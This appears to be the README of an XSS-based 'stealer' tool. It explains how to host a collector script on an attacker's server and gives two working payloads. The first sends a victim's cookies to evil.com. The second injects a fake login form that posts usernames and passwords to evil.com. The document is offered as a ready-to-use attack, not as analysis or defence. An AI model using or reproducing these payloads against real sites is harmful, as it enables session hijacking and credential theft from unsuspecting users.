# stealer-one
Cookie, user  and password stelear for XSS

To steal cookies - user and password 

XSS vulnerabilities


SETUP:
Upload c.php and admin.php to you evil web server.

Protect admin.php via .htaccess

USAGE EXAMPLE:

Example for cookies:
Payload
<script>location.href='http://evil.com/c.php?c='+escape(document.cookie)</script> 

Example for user/password:
<sCriPt>
document.getElementsByName('XSS')[0].style.display = "none";
var div = document.createElement('div');
div.className = 'vulnerable_code_area';
div.innerHTML = '<form name="evil" action="http://evil.com/c/c.php" method="GET"><p>User login:<br/><br/><label><b>Username: </b></label><input type="text" placeholder="Enter user name" name="uname" required><br/><label><b>Password:  </b></label><input type="password" placeholder="Enter Password" name="psw" required><br/><br/><button type="submit">Login</button></p></form>';
document.getElementsByClassName('vulnerable_code_area')[0].appendChild(div);
</sCriPt>
